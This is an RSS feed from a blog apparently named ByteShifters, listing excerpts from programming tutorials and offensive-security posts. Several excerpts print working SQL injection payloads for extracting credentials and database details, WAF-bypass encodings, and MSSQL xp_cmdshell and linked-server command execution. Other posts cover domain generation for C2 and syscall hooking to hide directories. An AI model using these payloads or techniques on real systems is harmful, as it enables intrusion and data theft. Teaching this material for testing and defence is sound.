<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on ByteShifters</title>
    <link>https://byteshifters.com/posts/</link>
    <description>Recent content in Posts on ByteShifters</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 04 Oct 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://byteshifters.com/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Custom Encryption Algorithm in Dlang</title>
      <link>https://byteshifters.com/posts/programming/algorithms/dlang/encryption-algorithm-in-dlang/</link>
      <pubDate>Fri, 04 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/algorithms/dlang/encryption-algorithm-in-dlang/</guid>
      
      <description>Implementing a Custom Encryption Algorithm in D Language In this blog post, we will implement a custom encryption algorithm in the D programming language. The encryption process will involve encrypting a message, decrypting it back to its original form, and displaying the results. Furthermore, we will analyze static analysis tools available in various programming languages and evaluate their effectiveness against malware detection.
Overview of the Encryption Algorithm Encryption algorithms are critical in securing data, ensuring confidentiality and integrity.</description>
      
    </item>
    
    <item>
      <title>Domain Generation Algorithms and Automatic Domain Registration in C2</title>
      <link>https://byteshifters.com/posts/system-security/malware-techniques/domain-name-generation-and-registration-in-c2/</link>
      <pubDate>Fri, 04 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/system-security/malware-techniques/domain-name-generation-and-registration-in-c2/</guid>
      
      <description>Domain Generation Algorithms and Automatic Domain Registration Domain Generation Algorithms (DGAs) are critical tools used in various applications, including both legitimate and malicious domains. This blog post discusses how DGAs function and demonstrates how to automatically register the generated domains using the Namecheap API.
What is a Domain Generation Algorithm (DGA)? A Domain Generation Algorithm (DGA) is a technique used primarily in malware to generate domain names that are used for command and control (C2) operations.</description>
      
    </item>
    
    <item>
      <title>Add custom Payloads Directly in SQLMap</title>
      <link>https://byteshifters.com/posts/hacking/sql-injections/custom-payloads-in-sqlmap/</link>
      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/hacking/sql-injections/custom-payloads-in-sqlmap/</guid>
      
      <description>Example: Using --sql-query Simple Custom Payload sqlmap -u &amp;#34;http://example.com/vulnerable.php?id=1&amp;#34; --sql-query=&amp;#34;SELECT version()&amp;#34; Union-Based Custom Payload sqlmap -u &amp;#34;http://example.com/vulnerable.php?id=1&amp;#34; --sql-query=&amp;#34;UNION SELECT null, database(), user(), version()&amp;#34; Customizing Payloads with Tamper Scripts If you need more flexibility and want to systematically apply custom payloads, you can create a tamper script that modifies the default payloads used by SQLMap.
Example: Custom Tamper Script Create a Custom Tamper Script
Create a new Python file in the tamper directory of your SQLMap installation, for example, custom_payload_tamper.</description>
      
    </item>
    
    <item>
      <title>Advanced SQLi Payloads and Techniques</title>
      <link>https://byteshifters.com/posts/hacking/sql-injections/advanced-sqli-payloads-techniques/</link>
      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/hacking/sql-injections/advanced-sqli-payloads-techniques/</guid>
      
      <description>Error-Based SQL Injection Advanced Error Payloads &amp;#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- - Union-Based Injection Determining the Number of Columns &amp;#39; UNION SELECT NULL, NULL, NULL, NULL -- Extracting Data &amp;#39; UNION SELECT username, password, NULL, NULL FROM users -- Blind SQL Injection Boolean-Based Blind &amp;#39; AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) -- Time-Based Blind &amp;#39; AND IF(1=1, SLEEP(5), 0) -- Second-Order SQL Injection Injection in Profile Information Modify data stored in one place to affect queries executed elsewhere.</description>
      
    </item>
    
    <item>
      <title>Extracting DB Name with Forced Errors</title>
      <link>https://byteshifters.com/posts/hacking/sql-injections/extract-database-name-with-forced-errors/</link>
      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/hacking/sql-injections/extract-database-name-with-forced-errors/</guid>
      
      <description>MySQL Extracting DB Name Use error-based injection to extract the database name.
&amp;#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- Extracting Hostname Use error-based injection to extract the hostname.
&amp;#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@hostname), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- PostgreSQL Extracting Database Name Use error-based injection to extract the current database name.</description>
      
    </item>
    
    <item>
      <title>Force Errors from Database to get SQLi</title>
      <link>https://byteshifters.com/posts/hacking/sql-injections/force-errors-from-database-for-sqli/</link>
      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/hacking/sql-injections/force-errors-from-database-for-sqli/</guid>
      
      <description>MSSQL OLE Automation Procedures DECLARE @Object INT; EXEC sp_OACreate &amp;#39;WScript.Shell&amp;#39;, @Object OUTPUT; EXEC sp_OAMethod @Object, &amp;#39;Run&amp;#39;, NULL, &amp;#39;cmd.exe /c whoami &amp;gt; C:\output.txt&amp;#39;; This uses OLE Automation procedures to execute system commands.
XP_CMD Shell with Privilege Escalation EXEC sp_configure &amp;#39;show advanced options&amp;#39;, 1; RECONFIGURE; EXEC sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; RECONFIGURE; EXEC xp_cmdshell &amp;#39;whoami&amp;#39;; This enables xp_cmdshell to execute system commands if it&amp;rsquo;s not already enabled.
Linked Servers EXEC sp_addlinkedserver &amp;#39;attacker_server&amp;#39;; EXEC sp_addlinkedsrvlogin &amp;#39;attacker_server&amp;#39;, &amp;#39;false&amp;#39;, NULL, &amp;#39;username&amp;#39;, &amp;#39;password&amp;#39;; EXEC (&amp;#39;xp_cmdshell &amp;#39;&amp;#39;net user&amp;#39;&amp;#39;&amp;#39;) AT attacker_server; This technique uses linked servers to run commands on a different server.</description>
      
    </item>
    
    <item>
      <title>Forcefully Generate Errors on Various DBMS</title>
      <link>https://byteshifters.com/posts/hacking/sql-injections/force-errors-on-various-dbms/</link>
      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/hacking/sql-injections/force-errors-on-various-dbms/</guid>
      
      <description>Advanced Methods Use of Invalid Functions MySQL provides many functions that, when used incorrectly, can generate errors.
&amp;#39; AND EXP(~(SELECT * FROM (SELECT 1) t)) -- Invalid Hexadecimal Conversion Using invalid hexadecimal values can cause errors.
&amp;#39; AND 0xG1 -- Subqueries in SELECT Clause Use subqueries that return multiple rows in a single value context.
&amp;#39; AND (SELECT * FROM (SELECT 1,2) t) = 1 -- PostgreSQL Invalid Regular Expression PostgreSQL&amp;rsquo;s regex functions can be used incorrectly to cause errors.</description>
      
    </item>
    
    <item>
      <title>Introduction to Advanced SQL Injection Techniques</title>
      <link>https://byteshifters.com/posts/hacking/sql-injections/introduction/</link>
      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/hacking/sql-injections/introduction/</guid>
      
      <description>Introduction to Advanced SQL Injection Techniques In the ever-evolving landscape of web security, SQL injection (SQLi) remains one of the most prevalent and effective attack vectors. Understanding the various techniques and strategies for exploiting SQLi vulnerabilities is essential for both attackers and defenders. This document introduces several key topics related to advanced SQL injection techniques, highlighting methods to extract sensitive information, bypass web application firewalls (WAFs), and generate errors from databases.</description>
      
    </item>
    
    <item>
      <title>Other Advanced SQLi Payloads</title>
      <link>https://byteshifters.com/posts/hacking/sql-injections/other-advanced-sqli-payloads/</link>
      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/hacking/sql-injections/other-advanced-sqli-payloads/</guid>
      
      <description>1. Time-Based Blind SQL Injection with Complex Payloads Time-based blind SQL injection relies on database responses based on time delays. This method is effective when the application does not return visible errors.
Payload: &amp;#39; AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&amp;gt;77,SLEEP(5),0)-- Explanation: This payload uses conditional statements to delay the response if the first character of the database name is greater than &amp;lsquo;M&amp;rsquo;. It helps in extracting data one character at a time.</description>
      
    </item>
    
    <item>
      <title>WAF Bypass Techniques for SQL Injection</title>
      <link>https://byteshifters.com/posts/hacking/sql-injections/waf-bypass-techniques-for-sqli/</link>
      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/hacking/sql-injections/waf-bypass-techniques-for-sqli/</guid>
      
      <description>WAF Bypass Techniques for SQL Injection Below are various methods to bypass WAFs and execute SQL injection attacks. Each technique takes advantage of different obfuscation, encoding, and manipulation strategies to evade detection.
1. Using Encoding and Obfuscation URL Encoding %27%20UNION%20SELECT%20NULL,NULL,NULL-- Encode parts of the payload to bypass basic keyword detection mechanisms used by WAFs.
Double URL Encoding %2527%2520UNION%2520SELECT%2520NULL,NULL,NULL-- Double encode the payload to evade more sophisticated detection mechanisms.
Hex Encoding &amp;#39; UNION SELECT 0x61646D696E, 0x70617373776F7264 -- Use hexadecimal encoding for the payload to obscure the SQL commands.</description>
      
    </item>
    
    <item>
      <title>Custom linux kernel Hooks with eBPF</title>
      <link>https://byteshifters.com/posts/programming/ebpf/custom-ebpf-hooks-linux/custom-ebpf-hooks-in-linux-kernel/</link>
      <pubDate>Wed, 02 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/ebpf/custom-ebpf-hooks-linux/custom-ebpf-hooks-in-linux-kernel/</guid>
      
      <description>Introduction to eBPF: Developing Custom Hooks in the Linux Kernel eBPF (Extended Berkeley Packet Filter) is a powerful Linux kernel technology that enables the development of custom tracing, networking, and security tools. By creating highly efficient and flexible hooks into the kernel, eBPF allows for deep insights into system behavior and high-performance packet filtering.
In this guide, we’ll cover the fundamentals of developing eBPF hooks, exploring the tools required, and providing code snippets to help you get started on your journey with eBPF.</description>
      
    </item>
    
    <item>
      <title>Introduction to ARM Architecture</title>
      <link>https://byteshifters.com/posts/programming/introduction-to-arm-architecture/</link>
      <pubDate>Sat, 21 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/introduction-to-arm-architecture/</guid>
      
      <description>Introduction to ARM Architecture ARM is a widely-used architecture in various devices due to its efficiency and power-saving features. Understanding ARM assembly provides you with the ability to write low-level code that directly interacts with hardware.
ARM Versions ARM has several versions, including ARMv7 (32-bit) and ARMv8 (64-bit). Each version introduces new instructions and capabilities.
Basic Concepts Registers Registers are crucial for ARM assembly programming. Each register has specific roles:</description>
      
    </item>
    
    <item>
      <title>Introduction to x64 ASM</title>
      <link>https://byteshifters.com/posts/programming/x64-asm/introduction-to-x64-asm/</link>
      <pubDate>Sat, 21 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/x64-asm/introduction-to-x64-asm/</guid>
      
      <description>1. Introduction to Assembly and x64 Architecture What is Assembly Language? Assembly language is a low-level programming language that is closely related to machine code. Each instruction corresponds directly to machine instructions executed by the CPU. Unlike high-level languages, assembly is architecture-specific, meaning that assembly code written for one architecture (e.g., x86) won&amp;rsquo;t work on another (e.g., ARM).
In this tutorial, we&amp;rsquo;ll focus on x64 assembly, the 64-bit extension of the x86 architecture.</description>
      
    </item>
    
    <item>
      <title>Introduction to Windows Syscalls</title>
      <link>https://byteshifters.com/posts/windows/syscalls-in-windows/</link>
      <pubDate>Tue, 17 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/windows/syscalls-in-windows/</guid>
      
      <description>Introduction to Syscalls in Windows System calls, or syscalls, are the primary means through which applications interact with the operating system (OS). They provide a controlled interface for programs to request services from the OS kernel, such as file operations, process management, and communication. This introduction will delve into Windows system calls, their structure, advanced usage, performance considerations, and best practices.
What are System Calls? System calls act as a bridge between user applications and the kernel, allowing applications to execute privileged operations safely.</description>
      
    </item>
    
    <item>
      <title>Linux Syscalls Table</title>
      <link>https://byteshifters.com/posts/linux/syscalls-table/</link>
      <pubDate>Fri, 13 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/linux/syscalls-table/</guid>
      
      <description>Overview This table lists the Linux system call numbers for the x86-64 architecture, starting from 2013, and provides detailed information such as the syscall name, arguments, and direct links to their manual pages and implementation in the kernel source code.
Data Source The data is extracted from the syscall_64.tbl file in the Linux 6.7 kernel source and the syscalls.h header file. The syscalls themselves are implemented as functions named in the Entry Point column and generated using the DEFINE_SYSCALLx macros.</description>
      
    </item>
    
    <item>
      <title>Advanced Python Concepts</title>
      <link>https://byteshifters.com/posts/programming/python/advanced-python-concepts/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/advanced-python-concepts/</guid>
      
      <description>Decorators Decorators are a way to modify or extend the behavior of functions or classes without changing their code.
Function Decorators
Function decorators are used to wrap another function, allowing you to execute code before or after the wrapped function, or even modify its behavior.
Example:
def my_decorator(func):def wrapper():print(&amp;#34;Something is happening before the function is called.&amp;#34;)func()print(&amp;#34;Something is happening after the function is called.&amp;#34;)return wrapper@my_decoratordef say_hello():print(&amp;#34;Hello!</description>
      
    </item>
    
    <item>
      <title>Advanced Tools and Best Practices</title>
      <link>https://byteshifters.com/posts/programming/python/advanced-tools-and-best-practices/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/advanced-tools-and-best-practices/</guid>
      
      <description>Virtual Environments Creating and Managing Virtual Environments with venv and virtualenv
Virtual environments allow you to create isolated Python environments for different projects, ensuring that dependencies do not conflict.
Using venv (built-in):
# Create a virtual environment named &amp;#39;env&amp;#39;python -m venv env# Activate the virtual environment# On Windows:.\env\Scripts\activate# On macOS/Linux:source env/bin/activate# Deactivate the virtual environmentdeactivate Using virtualenv (third-party):
# Install virtualenv if not already installedpip install virtualenv# Create a virtual environment named &amp;#39;env&amp;#39;virtualenv env# Activation and deactivation are the same as with `venv` Managing Dependencies with pip and pipenv</description>
      
    </item>
    
    <item>
      <title>Data Structures in Python</title>
      <link>https://byteshifters.com/posts/programming/python/data-structures/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/data-structures/</guid>
      
      <description>Lists Lists are ordered collections of items which can be of different types.
Creating Lists
You can create a list by placing items inside square brackets [], separated by commas.
my_list = [1, 2, 3, &amp;#34;apple&amp;#34;, &amp;#34;banana&amp;#34;] Accessing Elements
You can access elements of a list using index numbers, starting from 0 for the first element.
first_item = my_list[0] # first_item is 1 Slicing
You can extract a part of a list by slicing it.</description>
      
    </item>
    
    <item>
      <title>Error Handling and Exceptions</title>
      <link>https://byteshifters.com/posts/programming/python/error-handling/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/error-handling/</guid>
      
      <description>Understanding Exceptions Exceptions are errors that occur during the execution of a program. Understanding common exceptions can help you handle errors more effectively.
Common Exceptions: IndexError: Raised when trying to access an element from a list using an index that is out of range.
my_list = [1, 2, 3]item = my_list[5] # Raises IndexError KeyError: Raised when trying to access a key in a dictionary that does not exist.</description>
      
    </item>
    
    <item>
      <title>File Handling</title>
      <link>https://byteshifters.com/posts/programming/python/file-handling/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/file-handling/</guid>
      
      <description>Reading and Writing Files Python provides built-in functions and methods to work with files, allowing you to read from and write to them.
Opening Files
You can open a file using the open() function. The open() function takes two main arguments: the filename and the mode in which you want to open the file.
Modes:
&#39;r&#39;: Read mode (default mode). Opens the file for reading. &#39;w&#39;: Write mode. Opens the file for writing (creates a new file if it doesn&amp;rsquo;t exist or truncates the file if it does).</description>
      
    </item>
    
    <item>
      <title>Functions and Modules</title>
      <link>https://byteshifters.com/posts/programming/python/functions-and-modules/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/functions-and-modules/</guid>
      
      <description>Functions Functions are blocks of reusable code that perform a specific task.
Defining Functions
You can define a function using the def keyword, followed by the function name and parentheses ().
def greet(name):return f&amp;#34;Hello, {name}!&amp;#34; greeting = greet(&amp;#34;Alice&amp;#34;) # greeting is &amp;#34;Hello, Alice!&amp;#34; Arguments and Return Values
Functions can take arguments (inputs) and return a value.
def add(a, b):return a + bresult = add(3, 5) # result is 8 Default Arguments</description>
      
    </item>
    
    <item>
      <title>Introduction to Python</title>
      <link>https://byteshifters.com/posts/programming/python/introduction/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/introduction/</guid>
      
      <description>Python Roadmap: From Zero to Hero &amp;amp; Production Code 1. Python Basics Python Setup Install Python (latest version) Set up a development environment (VS Code, PyCharm, or Jupyter Notebook) Basic Syntax and Data Types Variables and data types: int, float, str, bool Input/Output operations: input(), print() Operators Arithmetic operators: +, -, *, /, //, %, ** Comparison operators: ==, !=, &amp;gt;, &amp;lt;, &amp;gt;=, &amp;lt;= Logical operators: and, or, not Control Structures Conditional statements: if, elif, else Loops: for, while Loop control: break, continue, pass 2.</description>
      
    </item>
    
    <item>
      <title>Object-Oriented Programming (OOP)</title>
      <link>https://byteshifters.com/posts/programming/python/object-oriented-programming/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/object-oriented-programming/</guid>
      
      <description>Classes and Objects Classes and objects are fundamental concepts in OOP. A class defines a blueprint for creating objects, while an object is an instance of a class.
Defining Classes and Creating Objects
A class is defined using the class keyword. Objects are created by calling the class as if it were a function.
Example:
class Dog:def __init__(self, name, age):self.name = nameself.age = agedef bark(self):return f&amp;#34;{self.</description>
      
    </item>
    
    <item>
      <title>Python Basics</title>
      <link>https://byteshifters.com/posts/programming/python/python-basics/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/python-basics/</guid>
      
      <description>Python Setup Before you start coding in Python, you need to install Python on your computer and set up a development environment.
Install Python
Download and install the latest version of Python from the official Python website.
Set Up a Development Environment
Choose an editor or an integrated development environment (IDE) to write and run your Python code. Popular choices include:
VS Code: A lightweight code editor with rich Python support.</description>
      
    </item>
    
    <item>
      <title>Testing and Debugging</title>
      <link>https://byteshifters.com/posts/programming/python/testing-and-debugging/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/testing-and-debugging/</guid>
      
      <description>Unit Testing Writing Test Cases Using unittest and pytest
Unit testing involves writing test cases to verify that individual parts of your code (functions, methods, etc.) work as expected.
unittest: A built-in Python module for writing and running tests. Example:
import unittestdef add(a, b):return a + bclass TestMathFunctions(unittest.TestCase):def test_add(self):self.assertEqual(add(1, 2), 3)self.assertEqual(add(-1, 1), 0)if __name__ == &amp;#39;__main__&amp;#39;:unittest.main() pytest: A third-party testing framework that is more flexible and has a simpler syntax than unittest.</description>
      
    </item>
    
    <item>
      <title>Web Development with Python</title>
      <link>https://byteshifters.com/posts/programming/python/web-development-with-python/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/web-development-with-python/</guid>
      
      <description>Introduction to Web Frameworks Understanding Web Frameworks
Web frameworks simplify the process of building web applications by providing a structure and tools for common web development tasks.
Flask: A lightweight, micro-framework that gives you the flexibility to structure your app as you want. Django: A full-fledged framework that comes with built-in features and a &amp;ldquo;batteries-included&amp;rdquo; philosophy, providing an out-of-the-box admin interface, ORM, and more. Setting Up a Flask or Django Project</description>
      
    </item>
    
    <item>
      <title>Working with Databases</title>
      <link>https://byteshifters.com/posts/programming/python/working-with-databases/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/python/working-with-databases/</guid>
      
      <description>SQL Basics Understanding SQL and Databases
SQL (Structured Query Language) is used to interact with relational databases. A database is a collection of structured data that can be easily accessed, managed, and updated.
Basic SQL Commands
Here are some fundamental SQL commands for interacting with a database:
SELECT: Retrieves data from a database. Example:
SELECT * FROM users; INSERT: Adds new rows to a table. Example:
INSERT INTO users (name, age) VALUES (&amp;#39;Alice&amp;#39;, 30); UPDATE: Modifies existing data within a table.</description>
      
    </item>
    
    <item>
      <title>Git, Zero to Hero</title>
      <link>https://byteshifters.com/posts/git/version-control/</link>
      <pubDate>Fri, 30 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/git/version-control/</guid>
      
      <description>Introduction to Git Git is a powerful distributed version control system that enables multiple developers to collaborate on projects, track changes, and manage code effectively. It maintains a complete history of changes, making it easy to revert to previous versions when necessary.
Installing Git Windows: Download the installer from git-scm.com. macOS: Install via Homebrew: brew install git Linux: Use your package manager, e.g.: sudo apt-get install git # For Debian-based systemssudo yum install git # For Red Hat-based systems Configuring Git After installation, configure your Git environment:</description>
      
    </item>
    
    <item>
      <title>Advanced C Programming Best Practices</title>
      <link>https://byteshifters.com/posts/programming/c/best-practices-in-c/</link>
      <pubDate>Mon, 29 Jul 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/programming/c/best-practices-in-c/</guid>
      
      <description>Introduction C programming is foundational for systems-level development and applications that demand high performance and low-level memory management. This document provides a comprehensive guide to writing secure, maintainable, and efficient C code, informed by practices used in industry-leading organizations like NASA and Google.
Secure Coding Practices Input Validation Always validate inputs to avoid vulnerabilities such as buffer overflows and injection attacks.
Input Type Recommended Practices Strings Use strncpy, snprintf for safer handling.</description>
      
    </item>
    
    <item>
      <title>Hooking `getdents64` to Hide Directories in Linux</title>
      <link>https://byteshifters.com/posts/system-security/malware-techniques/hide-dir-with-syscall-hooks/</link>
      <pubDate>Wed, 05 Jun 2024 00:00:00 +0000</pubDate>
      
      <guid>https://byteshifters.com/posts/system-security/malware-techniques/hide-dir-with-syscall-hooks/</guid>
      
      <description>Hooking getdents64 to Hide Directories in Linux Syscall hooking is a technique used in operating system development to intercept system calls made by user-space applications. This allows developers to modify or monitor the behavior of those calls without altering the application code. One common use case is hiding files or directories, which can be useful for security applications or debugging.
Use Cases Use Case Description Security Monitoring Intercept system calls to monitor suspicious activity.</description>
      
    </item>
    
  </channel>
</rss>
